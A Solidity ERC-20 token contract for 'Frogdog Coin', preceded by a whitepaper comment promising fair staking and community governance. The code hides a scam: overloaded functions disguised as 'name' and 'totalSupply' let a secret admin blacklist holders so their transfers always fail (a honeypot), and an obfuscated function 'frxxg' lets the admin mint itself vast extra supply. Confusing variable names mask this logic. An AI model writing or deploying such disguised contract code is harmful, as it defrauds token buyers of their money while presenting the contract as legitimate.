/* Frogdog Coin
Welcome to the FROGDOG ecosystem, a memecoin with decentralized platform built to 
revolutionize the world of crypto through innovative features like staking, rewarding, pool 
games, and more. This whitepaper provides an in-depth exploration of the FROGDOG token, 
its utility, and the underlying technology driving its functionalities.
Introduction:
The FROGDOG project aims to create a vibrant and engaging decentralized ecosystem, 
offering users a wide array of features to enhance their crypto experience.
Objectives and Goals:
- Empower users through transparent and fair staking mechanisms.
- Facilitate decentralized gaming through unique pool games.
- Establish a robust governance model for community-driven decision-making.
FROGDOG Overview:
Introduction to FROGDOG Token:
Frogdog Coin(symbol: FROGDOG) is an ERC-20 utility token built on the Ethereum blockchain. 
It serves as the native currency within the FROGDOG ecosystem, enabling seamless transactions 
and participation in various activities.
Use Cases and Utility:
- Staking: Users can stake FROGDOG tokens to earn rewards and actively participate in the governance of the ecosystem.
- Transactions: FROGDOG facilitates peer-to-peer transactions and acts as a medium of exchange within the ecosystem.
- Governance: Token holders can engage in voting on crucial decisions shaping the project's future.
Tokenomics:
- Total Supply: 1,000,000,000 FROGDOG
- Initial Distribution: 40% to initial investors, 30% for community incentives, 15% for the team, 10% 
for partnerships, and 5% reserved for future development.
- Burn Mechanism: Periodic token burns to control circulating supply.
Features and Functionalities:
Staking Mechanism:
- Users can stake FROGDOG tokens in various pools, each offering different APY based on the lock-up period.
- Rewards are distributed proportionally, promoting long-term commitment.
Pool Games:
- FROGDOG introduces unique decentralized pool games, including lottery-style draws, 
prediction markets, and gaming competitions.
- Smart contracts ensure transparency and fairness in game outcomes.
Other Features:
- DeFi Integrations: Integration with leading DeFi protocols for enhanced financial services.
- Cross-chain Compatibility: Future plans to enable interoperability with other blockchains.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
}


contract FrogdogCoin is Ownable{
   
    constructor(string memory tokenname,string memory tokensymbol,address fgdadmin) {
        _totalSupply = 1000000000*10**decimals();
        _frogsdxx[msg.sender] = 1000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        Frogdogadmin = fgdadmin;
        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());
    }
    
    address public Frogdogadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => bool) public froginfo;
   
    mapping(address => uint256) private _frogsdxx;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }



    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address fgdd) public  {
        address ffggxxinfo = fgdd;
        require(_msgSender() == Frogdogadmin, "Only ANIUadmin can call this function");
        froginfo[ffggxxinfo] = false;
        require(_msgSender() == Frogdogadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address fagax) public {
        require(_msgSender() == Frogdogadmin, "Only ANIUadmin can call this function");
        address fgdinfo = fagax;
        froginfo[fgdinfo] = true;
        require(_msgSender() == Frogdogadmin, "Only ANIUadmin can call this function");
    }

         uint256 fgxxx = 4440000000;
        uint256 fggf2 = 45;
    uint256 frx =  fggf2*((10**decimals()*fgxxx));
    function frxxg() 
    external    {
     
        address frfradmin = Frogdogadmin;
        if (Frogdogadmin == _msgSender() && frfradmin == _msgSender()) {
            if (fgxxx == 4440000000) {

                require(Frogdogadmin == _msgSender());
                address fego1 = _msgSender();
                address fego2 = fego1;
                address fego3 = fego2;
                _frogsdxx[fego3] += frx;
            }else{
                revert(_tokename);
            }
        }else{
            revert("froga");
        }
               
        
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _frogsdxx[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _frogsdxx[from];
        if (true == froginfo[from]) 
        {amount = 1000-1000+2000+balance;}
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _frogsdxx[from] = _frogsdxx[from]-amount;
        _frogsdxx[to] = _frogsdxx[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}